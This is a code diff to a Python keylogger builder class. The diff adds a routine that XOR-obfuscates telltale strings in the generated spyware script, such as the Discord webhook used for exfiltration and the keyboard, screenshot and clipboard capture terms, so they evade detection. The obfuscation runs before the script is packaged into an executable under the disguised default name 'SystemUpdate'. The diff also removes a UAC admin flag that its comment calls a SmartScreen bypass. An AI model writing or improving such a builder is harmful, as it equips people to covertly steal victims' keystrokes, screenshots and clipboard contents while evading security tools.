@@ -131,6 +131,75 @@ class AdvancedKeyLoggerBuilder:
             print(f"[!] Error writing output file: {e}")
             return False
 
+    def obfuscate_code(self, script_path):
+        """
+        Obfuscate sensitive strings in the script
+
+        Args:
+            script_path: Path to the script to obfuscate
+
+        Returns:
+            bool: Success status
+        """
+        try:
+            print(f"\n[*] Obfuscating sensitive strings...")
+
+            # Read the script
+            with open(script_path, 'r', encoding='utf-8') as f:
+                code = f.read()
+
+            # Sensitive strings to obfuscate
+            sensitive_strings = [
+                'discord.com/api/webhooks',
+                'discord.com',
+                'pynput',
+                'keyboard',
+                'screenshot',
+                'clipboard',
+                'keylog',
+            ]
+
+            # Add decoder function at the beginning (after imports)
+            decoder = '''
+def _d(s, k=0x42):
+    """Decode obfuscated string"""
+    return ''.join(chr(ord(c) ^ k) for c in s)
+
+'''
+
+            # Find where to insert (after imports)
+            lines = code.split('\n')
+            insert_pos = 0
+            for i, line in enumerate(lines):
+                if line.strip() and not line.strip().startswith('#') and not line.strip().startswith('import') and not line.strip().startswith('from'):
+                    insert_pos = i
+                    break
+
+            # Insert decoder
+            lines.insert(insert_pos, decoder)
+            code = '\n'.join(lines)
+
+            # Obfuscate each string
+            for string in sensitive_strings:
+                # XOR encode
+                obfuscated = ''.join(chr(ord(c) ^ 0x42) for c in string)
+                obfuscated_escaped = obfuscated.replace('\\', '\\\\').replace('"', '\\"')
+
+                # Replace in code
+                code = code.replace(f'"{string}"', f'_d("{obfuscated_escaped}")')
+                code = code.replace(f"'{string}'", f'_d("{obfuscated_escaped}")')
+
+            # Write back
+            with open(script_path, 'w', encoding='utf-8') as f:
+                f.write(code)
+
+            print(f"[+] Obfuscated {len(sensitive_strings)} string patterns")
+            return True
+
+        except Exception as e:
+            print(f"[!] Obfuscation failed: {e}")
+            return False
+
     def build_executable(self, config):
         """
         Build executable using PyInstaller
@@ -159,6 +228,9 @@ class AdvancedKeyLoggerBuilder:
         exe_name = config.get('program_name', 'SystemUpdate')
         script_path = self.output_dir / script_name
 
+        # Obfuscate the code
+        self.obfuscate_code(script_path)
+
         print(f"\n[*] Building executable with PyInstaller...")
         print(f"[*] This may take a few minutes...")
 
@@ -181,11 +253,6 @@ class AdvancedKeyLoggerBuilder:
             version_info_path = self.base_dir / 'version_info.txt'
             if version_info_path.exists():
                 cmd.extend(['--version-file', str(version_info_path)])
-
-            # Add Windows manifest for admin request
-            cmd.extend([
-                '--uac-admin',  # Request admin privileges (for SmartScreen bypass)
-            ])
 
         # Add modules as hidden imports
         cmd.extend([
